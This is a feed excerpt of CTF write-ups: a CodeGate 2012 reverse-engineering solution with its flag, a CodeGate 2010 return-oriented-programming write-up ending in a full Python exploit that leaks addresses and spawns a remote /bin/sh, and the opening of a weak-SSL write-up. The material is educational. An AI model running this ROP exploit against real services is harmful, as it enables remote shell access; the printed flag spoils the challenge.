+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Challenge: <strong>The Rewolf in Kaspersky </strong><br /> Link to challenge : <a rel="nofollow" href="http://deroko.phearless.org/codegate2012/bin/bin400.zip">http://deroko.phearless.org/codegate2012/bin/bin400.zip</a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  So Rewolf vm, is packed with something called <strong>KasperSky</strong> according to<strong>ProtectionID</strong> (never heard of this packer ). Unpacking is trivial, like with any simple packer. Run to OEP, dump, fix imports:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Here is OEP for ReWolf VM:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Rewolf_oep.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/6/6d/Rewolf_oep.png" alt="Rewolf oep.png" width="398" height="198" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  And here is OEP for original program (note you need to dump at ReWolf VM, but importrec will work only properly if you use this OEP) :
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Real_oep.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/b/b9/Real_oep.png" alt="Real oep.png" width="398" height="225" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Once we have file dumped, we might run it to get idea how it actually looks like:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Appwindow.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/6/6c/Appwindow.png" alt="Appwindow.png" width="266" height="82" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Not much there :( 1st time I pressed some key while program was focused I got an exception:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Exception.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/4/44/Exception.png" alt="Exception.png" width="944" height="115" /></a><br /> <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Exception_code.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/c/c6/Exception_code.png" alt="Exception code.png" width="497" height="23" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  At first I thought that my dump is broken, so I tried with original application, same thing happened. Hmmm so this is common problem, but challenge is definitely not broken, so we need to see what&#8217;s going on, and trace instruction per instruction in ReWolf VM.
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  After a little bit of tracing I noticed that exception comes after virtualized jcc is executed, because next instruction size is wrong. (From exception you can see that<strong>ecx</strong> is quite big number which it should not be):
+</p>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041D000</span>   <span style="color: #0000ff">50</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EAX</span>            &lt;<span style="color: #339933">-----</span> start of jcc opcode
+<span style="color: #adadad;font-style: italic">0041D001</span>   9C               <span style="color: #00007f;font-weight: bold">PUSHFD</span>
+<span style="color: #adadad;font-style: italic">0041D002</span>   <span style="color: #0000ff">58</span>               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EAX</span>
+<span style="color: #adadad;font-style: italic">0041D003</span>   <span style="color: #0000ff">53</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EBX</span>
+<span style="color: #adadad;font-style: italic">0041D004</span>   E8 <span style="color: #0000ff">00000000</span>      <span style="color: #00007f;font-weight: bold">CALL</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D009
+<span style="color: #adadad;font-style: italic">0041D009</span>   5B               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EBX</span>
+<span style="color: #adadad;font-style: italic">0041D00A</span>   8D5453 <span style="color: #0000ff">08</span>        <span style="color: #00007f;font-weight: bold">LEA</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="font-weight: bold">DWORD</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EBX</span><span style="color: #339933">+</span><span style="color: #00007f">EDX</span><span style="color: #339933">*</span><span style="color: #0000ff">2</span><span style="color: #339933">+</span><span style="color: #0000ff">8</span><span style="color: #009900;font-weight: bold">]</span>
+<span style="color: #adadad;font-style: italic">0041D00E</span>   5B               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EBX</span>
+<span style="color: #adadad;font-style: italic">0041D00F</span>   FFE2             <span style="color: #00007f;font-weight: bold">JMP</span> <span style="color: #00007f">EDX</span></pre>
+  </div>
+</div>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  If jcc is taked <strong>edx</strong> is set to 1, otherwise <strong>edx</strong> is 0.
+</p>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041D0DE</span>   33D2             <span style="color: #00007f;font-weight: bold">XOR</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="color: #00007f">EDX</span>                              <span style="color: #666666;font-style: italic">; test.0041D023</span>
+<span style="color: #adadad;font-style: italic">0041D0E0</span>   EB <span style="color: #0000ff">04</span>            <span style="color: #00007f;font-weight: bold">JMP</span> <span style="font-weight: bold">SHORT</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D0E6
+<span style="color: #adadad;font-style: italic">0041D0E2</span>   33D2             <span style="color: #00007f;font-weight: bold">XOR</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="color: #00007f">EDX</span>
+<span style="color: #adadad;font-style: italic">0041D0E4</span>   EB <span style="color: #0000ff">01</span>            <span style="color: #00007f;font-weight: bold">JMP</span> <span style="font-weight: bold">SHORT</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D0E7
+<span style="color: #adadad;font-style: italic">0041D0E6</span>   <span style="color: #0000ff">42</span>               <span style="color: #00007f;font-weight: bold">INC</span> <span style="color: #00007f">EDX</span>
+<span style="color: #adadad;font-style: italic">0041D0E7</span>   <span style="color: #0000ff">50</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EAX</span>
+<span style="color: #adadad;font-style: italic">0041D0E8</span>   9D               <span style="color: #00007f;font-weight: bold">POPFD</span>
+<span style="color: #adadad;font-style: italic">0041D0E9</span>   <span style="color: #0000ff">58</span>               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EAX</span></pre>
+  </div>
+</div>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041D4AA</span>   5A               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EDX</span>                &lt;<span style="color: #339933">----</span> <span style="color: #00007f;font-weight: bold">pop</span> EIP <span style="color: #009900;font-weight: bold">(</span>jcc <span style="color: #00007f;font-weight: bold">not</span> taken<span style="color: #009900;font-weight: bold">)</span>
+<span style="color: #adadad;font-style: italic">0041D4AB</span>   <span style="color: #0000ff">58</span>               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EAX</span>
+<span style="color: #adadad;font-style: italic">0041D4AC</span>  ^E9 2CFFFFFF      <span style="color: #00007f;font-weight: bold">JMP</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D3DD
+<span style="color: #adadad;font-style: italic">0041D4B1</span>   0FB657 <span style="color: #0000ff">03</span>        <span style="color: #00007f;font-weight: bold">MOVZX</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="font-weight: bold">BYTE</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDI</span><span style="color: #339933">+</span><span style="color: #0000ff">3</span><span style="color: #009900;font-weight: bold">]</span>
+<span style="color: #adadad;font-style: italic">0041D4B5</span>   FF7424 <span style="color: #0000ff">08</span>        <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="font-weight: bold">DWORD</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">SS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">ESP</span><span style="color: #339933">+</span><span style="color: #0000ff">8</span><span style="color: #009900;font-weight: bold">]</span>
+<span style="color: #adadad;font-style: italic">0041D4B9</span>   9D               <span style="color: #00007f;font-weight: bold">POPFD</span>
+<span style="color: #adadad;font-style: italic">0041D4BA</span>   E8 41FBFFFF      <span style="color: #00007f;font-weight: bold">CALL</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D000
+<span style="color: #adadad;font-style: italic">0041D4BF</span>   85D2             <span style="color: #00007f;font-weight: bold">TEST</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="color: #00007f">EDX</span>
+<span style="color: #adadad;font-style: italic">0041D4C1</span>  ^<span style="color: #0000ff">74</span> E7            <span style="color: #00007f;font-weight: bold">JE</span> <span style="font-weight: bold">SHORT</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D4AA
+<span style="color: #adadad;font-style: italic">0041D4C3</span>   5A               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EDX</span>
+<span style="color: #adadad;font-style: italic">0041D4C4</span>   <span style="color: #0000ff">0357</span> <span style="color: #0000ff">04</span>          <span style="color: #00007f;font-weight: bold">ADD</span> <span style="color: #00007f">EDX</span><span style="color: #339933">,</span><span style="font-weight: bold">DWORD</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDI</span><span style="color: #339933">+</span><span style="color: #0000ff">4</span><span style="color: #009900;font-weight: bold">]</span> &lt;<span style="color: #339933">---</span> increment EIP <span style="color: #009900;font-weight: bold">(</span>jcc taken<span style="color: #009900;font-weight: bold">)</span>
+<span style="color: #adadad;font-style: italic">0041D4C7</span>   <span style="color: #0000ff">034F</span> <span style="color: #0000ff">04</span>          <span style="color: #00007f;font-weight: bold">ADD</span> <span style="color: #00007f">ECX</span><span style="color: #339933">,</span><span style="font-weight: bold">DWORD</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDI</span><span style="color: #339933">+</span><span style="color: #0000ff">4</span><span style="color: #009900;font-weight: bold">]</span>
+<span style="color: #adadad;font-style: italic">0041D4CA</span>   <span style="color: #0000ff">58</span>               <span style="color: #00007f;font-weight: bold">POP</span> <span style="color: #00007f">EAX</span>
+<span style="color: #adadad;font-style: italic">0041D4CB</span>  ^E9 5AFEFFFF      <span style="color: #00007f;font-weight: bold">JMP</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D32A</pre>
+  </div>
+</div>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <strong>[edi+4] = 00000104</strong>
+</p>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041D32A</span>   8BF2             <span style="color: #00007f;font-weight: bold">MOV</span> <span style="color: #00007f">ESI</span><span style="color: #339933">,</span><span style="color: #00007f">EDX</span>
+<span style="color: #adadad;font-style: italic">0041D32C</span>   <span style="color: #0000ff">46</span>               <span style="color: #00007f;font-weight: bold">INC</span> <span style="color: #00007f">ESI</span>
+<span style="color: #adadad;font-style: italic">0041D32D</span>   8A02             <span style="color: #00007f;font-weight: bold">MOV</span> <span style="color: #00007f">AL</span><span style="color: #339933">,</span><span style="font-weight: bold">BYTE</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDX</span><span style="color: #009900;font-weight: bold">]</span>           &lt;<span style="color: #339933">---</span> <span style="font-weight: bold">size</span> of next instruction
+<span style="color: #adadad;font-style: italic">0041D32F</span>   <span style="color: #0000ff">3242</span> <span style="color: #0000ff">01</span>          <span style="color: #00007f;font-weight: bold">XOR</span> <span style="color: #00007f">AL</span><span style="color: #339933">,</span><span style="font-weight: bold">BYTE</span> <span style="font-weight: bold">PTR</span> <span style="color: #00007f">DS</span><span style="color: #339933">:</span><span style="color: #009900;font-weight: bold">[</span><span style="color: #00007f">EDX</span><span style="color: #339933">+</span><span style="color: #0000ff">1</span><span style="color: #009900;font-weight: bold">]</span>         &lt;<span style="color: #339933">---</span> <span style="color: #00007f;font-weight: bold">xor</span> 1st <span style="color: #0000ff">2</span> bytes to get proper sie
+<span style="color: #adadad;font-style: italic">0041D332</span>   0FB6C0           <span style="color: #00007f;font-weight: bold">MOVZX</span> <span style="color: #00007f">EAX</span><span style="color: #339933">,</span><span style="color: #00007f">AL</span>
+<span style="color: #adadad;font-style: italic">0041D335</span>   <span style="color: #0000ff">50</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EAX</span>                           &lt;<span style="color: #339933">---</span> <span style="font-weight: bold">size</span> of instruction passed to memcpy
+<span style="color: #adadad;font-style: italic">0041D336</span>   <span style="color: #0000ff">56</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">ESI</span>
+<span style="color: #adadad;font-style: italic">0041D337</span>   <span style="color: #0000ff">57</span>               <span style="color: #00007f;font-weight: bold">PUSH</span> <span style="color: #00007f">EDI</span>
+<span style="color: #adadad;font-style: italic">0041D338</span>   E8 D8050000      <span style="color: #00007f;font-weight: bold">CALL</span> <span style="color: #00007f;font-weight: bold">test</span><span style="color: #339933">.</span>0041D915                 &lt;<span style="color: #339933">---</span> memcpy</pre>
+  </div>
+</div>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <strong>BOOM Exception</strong>
+</p>
+
+<div style="font-family: sans-serif;font-size: 13px;text-align: left" dir="ltr">
+  <div style="line-height: normal;font-family: monospace">
+    <pre style="font-family: monospace, 'Courier New';background-color: initial;font: normal normal normal 1em/1.2em monospace;margin-top: 0px;margin-bottom: 0px;vertical-align: top;padding: 0px;border: 0px none white"><span style="color: #adadad;font-style: italic">0041DB10</span>  <span style="color: #0000ff">25</span> <span style="color: #0000ff">93</span> <span style="color: #0000ff">97</span> B6 C4 C5 <span style="color: #0000ff">89</span> 8A                          <span style="color: #339933">%</span>“—¶ÄÅ‰Š</pre>
+  </div>
+</div>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Instruction size is calculated as <strong>25 ^ 93 = B6</strong> which is wrong for instruction size in this case.
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  At this point I decided to try and patch jcc vm handler so jcc will not be taken:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Patch.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/6/63/Patch.png" alt="Patch.png" width="399" height="189" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  and then I typed something:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Firstcharacter.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/7/7c/Firstcharacter.png" alt="Firstcharacter.png" width="270" height="81" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  And then I just kept pressing keys:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Okunlocked.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/8/85/Okunlocked.png" alt="Okunlocked.png" width="270" height="83" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  Press <strong>OK</strong> and you get the key:
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <a style="text-decoration: none;color: #0b0080;background-color: initial" href="http://www.xchg.info/wiki/index.php?title=File:Finalkey.png"><img style="vertical-align: middle;margin: 0px;border: initial none initial" src="http://www.xchg.info/wiki/images/2/21/Finalkey.png" alt="Finalkey.png" width="269" height="83" /></a>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  So correct key for bin400 is : <strong>WonderFul_lollol_!</strong>
+</p>
+
+<p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+  <h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
+    <span id="Greetings">Greetings</span>
+  </h3>
+  
+  <p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+    I would like to say tnx to my <strong>ARTeam</strong> mates, <strong>vnsecurity</strong> guys, and of course<strong>superkhung</strong> for listening to my random blabing on skype during CTF :)
+  </p>
+  
+  <h3 style="margin-top: 0px;margin-right: 0px;margin-bottom: 0.3em;margin-left: 0px;padding-top: 0.5em;padding-bottom: 0.17em;border-bottom-width: initial;border-bottom-style: none;border-bottom-color: initial;width: auto;font-size: 17px;font-family: sans-serif">
+    <span id="Author">Author</span>
+  </h3>
+  
+  <p style="margin-top: 0.4em;margin-right: 0px;margin-bottom: 0.5em;margin-left: 0px;font-family: sans-serif;font-size: 13px">
+    <strong>deroko of ARTeam</strong>
+  </p>
+  
+  <div>
+    <strong><br /> </strong>
+  </div>
+</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>Return-oriented-programming practice: exploiting CodeGate 2010 Challenge 5</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-04-18T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/04/18/return-oriented-programming-practice-exploiting-codegate-2010-challenge-5.html</guid>
+  <description><![CDATA[
+     <p>In my <a href="http://www.vnsecurity.net/2010/03/codegate-2010-online-ctf-challenge-4-5-writeup/" target="_blank">previous post</a> about CodeGate 2010 Challenge 5 exploit, I mentioned the weakness of accessing server to get <em>execl()</em> address. In this post I will show how to blindly exploit the “harder” program without access to the remote server using <a href="http://en.wikipedia.org/wiki/Return-oriented_programming" target="_blank">return-oriented-programming</a> technique.</p>
+
+<h2 id="rop-introduction">ROP introduction</h2>
+
+<p>A worth to read post about ROP introduction can be found on Zynamics blog: <a href="http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/" target="_blank">http://blog.zynamics.com/2010/03/12/a-gentle-introduction-to-return-oriented-programming/</a></p>
+
+<p>In summary: we will use return-into-instructions (called gadgets) to build and execute our payload when controlled EIP and ESP from vulnerable program.</p>
+
+<p>ROP limitations (difficulties):</p>
+
+<ul>
+  <li>ASLR: the same as return-into-libc, it’s difficult to locate address of instructions in library (e.g libc)</li>
+  <li>ASCII-armor address: with ascii-armor remapping of libraries (e.g libc), addresses will contain NULL byte so chaining return-into-libc calls and ROP is impossible if there’s NULL filter in input</li>
+</ul>
+
+<h2 id="the-8220harder8221-case">The “harder” case</h2>
+
+<p>Fortunately, we can blindly exploit the “harder” program using ROP because it provides some “advantages” in code:</p>
+
+<ul>
+  <li><em>getline()</em>: can pass NULL byte to input</li>
+  <li><em>printf()</em>: can leak runtime memory info (bypass ASLR)</li>
+</ul>
+
+<h2 id="finding-rop-gadgets">Finding ROP gadgets</h2>
+
+<p>Our target is to invoke <strong>execve(“/bin/sh”, 0, 0)</strong> syscall, which is equivalent to prepare registers’ value then trigger kernel syscall:</p>
+
+<blockquote>
+  <p>eax = 0xb // execve<br />
+ebx = address of “/bin/sh”<br />
+ecx = 0 // argv<br />
+edx = 0 // env</p>
+</blockquote>
+
+<p>Searching in harder binary, we found below gadgets:</p>
+
+<ul>
+  <li>eax: 
+    <pre>80483a4:    58                       pop    %eax
+80483a5:    5b                       pop    %ebx
+80483a6:    c9                       leave
+80483a7:    c3                       ret</pre>
+  </li>
+  <li>ebx &amp; ecx: 
+    <pre>8048634:    59                       pop    %ecx
+8048635:    5b                       pop    %ebx
+8048636:    c9                       leave
+8048637:    c3                       ret</pre>
+
+    <p>“/bin/sh” is placed on target buffer, its address is available by leaking via <em>printf()</em>&lt;/li&gt; &lt;/ul&gt; 
+*   edx:<br />
+    There’s no edx related gadget but observing that when returned from <em>memcpy()</em> edx’s value is set to esi so we can assign esi to 0×0 first then return again to main to nullify edx.&lt;/p&gt; 
+    &lt;pre&gt;0x001ba506 :    mov    edx,esi
+80485e6:    5e                       pop    %esi
+80485e7:    5f                       pop    %edi
+80485e8:    5d                       pop    %ebp
+80485e9:    c3                       ret&lt;/pre&gt;</p>
+
+    <ul>
+      <li>
+        <p>syscall:<br />
+In recent Linux kernel, syscall is usually performed via linux gate: <strong>call gs:[0x10]</strong>. By return to back to <em>printf()</em> in harder program many times, we can find the offset from <em>getline()</em> to first syscall is 319 bytes.</p>
+      </li>
+      <li>
+        <p>moving stack:<br />
+After <strong>“leave; ret”</strong> our stack will be moved to new location pointing by ebp. We can control this by set ebp back to somewhere in the middle of target buffer.</p>
+      </li>
+    </ul>
+
+    <h2 id="exploit-code">Exploit code</h2>
+
+    <pre class="brush: python; title: ; notranslate" title="">#!/usr/bin/env python
+
+</pre>
+  </li>
+</ul>
+<p>import socket
+import sys
+import struct
+import telnetlib</p>
+
+<h1 id="host--ctf4codegateorg">host = ‘ctf4.codegate.org’</h1>
+<p>host = ‘127.0.0.1’
+port = 9005</p>
+
+<p>c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+c.connect((host, port))</p>
+
+<p>buf=””
+# bypass first read
+buf = c.recv(1024)</p>
+
+<h1 id="getline-address">getline() address</h1>
+<p>buf = “A”*268 + struct.pack(‘i’, 0x08048524) + struct.pack(‘i’, 0x0804a008) + “n”
+c.send(buf)
+buf = c.recv(1024)
+addr = “”
+getline_addr = int(buf[:4][::-1].encode(‘hex’), 16)
+print “getline() is at:”, hex(getline_addr)</p>
+
+<h1 id="call-gs0x10-address">call gs:[0x10] address</h1>
+<p>offset = 319 # first offset is 319 bytes from getline()
+syscall_addr = getline_addr + offset</p>
+
+<h1 id="buffer-address">buffer address</h1>
+<p>buf = “%7$x” + “x00”<em>260 + struct.pack(‘i’, 0x08048521)</em>2 + “n”
+c.send(buf)
+buf = c.recv(1024)
+input_addr = int(buf[:8], 16)
+print “Buffer address is at: “, hex(input_addr)</p>
+
+<h1 id="gadgets-address">gadgets address</h1>
+<p>pop_eax = 0x080483a4
+pop_ecx_ebx = 0x08048634
+pop_esi = 0x080485e6</p>
+
+<h1 id="pop-esi">pop esi</h1>
+<p>buf = “A”<em>268 + struct.pack(‘i’, pop_esi) + “x00” * 12 + struct.pack(‘i’, 0x08048524)</em>2  + “n”
+c.send(buf)
+c.recv(1024)</p>
+
+<h1 id="pop-eax-then-move-stack-to-new-address">pop eax then move stack to new address</h1>
+<p>input_addr += 560 # lifting after 2 getline() calls
+new_stack = input_addr+8
+buf = “/bin/shx00” # /bin/sh
+buf += struct.pack(‘i’, new_stack+16) # next ebp after leave from pop_eax
+buf += struct.pack(‘i’, pop_ecx_ebx) # next is pop_ecx_ebx
+buf += “x00”<em>4 # ecx
+buf += struct.pack(‘i’, input_addr) # ebx -&gt; /bin/sh
+buf += “A”</em>4 # un-used ebp after leave from pop_ecx_ebx
+buf += struct.pack(‘i’, syscall_addr)
+buf = buf.ljust(264, “A”) # padding
+buf += struct.pack(‘i’, new_stack) # new ebp
+buf += struct.pack(‘i’, pop_eax)
+buf += “x0bx00x00x00” # execve syscal
+buf += “A”*4 # un-used ebx
+buf += “n”</p>
+
+<p>print “Sending final payload …”
+c.send(buf)
+c.send(“id 2&gt;&amp;1” + “n”*5)</p>
+
+<p>t = telnetlib.Telnet()
+t.sock = c
+t.interact()
+c.close()</p>
+
+<p>&lt;/pre&gt;</p>
+
+  ]]></description>
+</item>
+
+	<item>
+  <title>CodeGate 2010 &#8211; Challenge 7: Weak SSL Cracking</title>
+  <link>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge7-weak-ssl-cracking.html</link>
+  <author>R.J. Lorimer</author>
+  <pubDate>2010-03-23T00:00:00+08:00</pubDate>
+  <guid>http://realjenius.com/ctf%20-%20clgt%20crew/2010/03/23/codegate-2010-challenge7-weak-ssl-cracking.html</guid>
+  <description><![CDATA[
+     <p>Writeup for CodeGate 2010 – Challenge 7 by <a href="http://namnham.blogspot.com/" target="_blank">namnx</a></p>
+
+<hr />
+
+<div style="text-align: justify">
+  Last weekend, I had a great hacking time with team <a href="http://www.vnsecurity.net/about-us/clgt-ctf-team/">CLGT</a> in the <a href="http://ctf.codegate.org/">CodeGate 2010 CTF</a> Preliminary Round. It lasted 36 consecutive hours from 7:00AM March 13 to 7:00PM March 14. There were a lot of teams around the world participating in this hacking contest. And excellently, CLGT proved it as one of the best teams when got the 2nd place in this round. See <a href="http://beist.org/CG2010_rank.png">final ranking</a>.
+</div>
+
+<div style="text-align: justify">
+  This entry is my writeup for challenge 7. I think this is an interesting challenge from which you can learn more deeply about SSL protocol and public key cryptography. In this challenge, we were provided a tcpdump file of a SSL traffic and a hint &#8220;<em>does the modulus look familiar?</em>&#8220;. So our goal is to analyze and decrypt this captured traffic to get the flag.
+</div>
+
+<p><strong><span style="font-family: Georgia,'Times New Roman',serif">Analysis</span></strong><br />
+Firstly, I used Wireshark to load this file and start to analyze it:</p>
+
+<div style="clear: both;text-align: center">
